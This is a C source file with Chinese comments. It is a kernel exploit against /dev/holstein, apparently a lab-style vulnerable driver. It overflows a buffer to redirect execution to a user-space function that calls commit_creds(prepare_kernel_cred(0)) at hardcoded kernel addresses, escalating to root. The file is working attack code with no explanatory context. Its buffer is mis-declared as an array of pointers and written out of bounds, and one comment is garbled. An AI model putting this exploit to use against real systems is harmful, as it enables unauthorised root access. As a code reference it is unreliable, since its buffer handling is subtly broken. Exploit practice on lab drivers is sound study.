#include <stdio.h>
#include <fcntl.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>


// 定义8字节长整型的地址,提权commit_creds结构体传入的函数
unsigned long prepare_kernel_cred = 0xffffffff8106e240;
// 定义8字节长整型的地址,提权的commit_creds结构体
unsigned long commit_creds = 0xffffffff8106e390;

void fatal(const char *msg) {
  perror(msg);
  // 属于<stdlib.h>库
  exit(1);
}

// 提权函数,将进程至未零
static void escalate_privilege() {
  // commit_creds(prepare_kernel_cred(0));
  char* (*pkc)(int) = (void*)(prepare_kernel_cred);
  void (*cc)(char*) = (void*)(commit_creds);
  (*cc)((*pkc)(0));
}


int main(){
    // 打开漏洞的dev,同时具有读写权限
    int fd = open("/dev/holstein", O_RDWR);
    if (fd == -1) fatal("open(\"/dev/holstein\")");

    // 定义溢出的buf
    char *buf[410];
    memset(buf, 'A', 0x410);

    // 在0x408偏移处填入跳转地址
    *(unsigned long*)&buf[0x408] = (unsigned long)&escalate_privilege;
    // *(unsigned long*)&buf[0x408] = (unsigned long)"0x11223344";
    // 写入漏洞,判断返回的RIP
    write(fd, buf, 0x410);

    return 0;
}